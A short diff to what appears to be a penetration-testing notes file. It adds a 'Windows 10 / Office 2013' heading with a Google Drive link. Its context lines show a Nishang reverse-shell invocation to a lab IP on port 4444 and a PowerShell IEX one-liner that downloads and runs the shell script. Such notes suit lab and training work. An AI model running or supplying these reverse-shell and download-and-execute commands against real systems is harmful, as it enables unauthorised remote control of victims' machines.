@@ -57,3 +57,9 @@ $ wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/S
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -Port 4444
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellTcp.ps1')
 ```
+
+## Windows 10
+
+### Office 2013
+https://drive.google.com/file/d/11wmov4jpwOzQ2A0Rq0osQ4-YjdfsLTEV/view?usp=drive_link
+
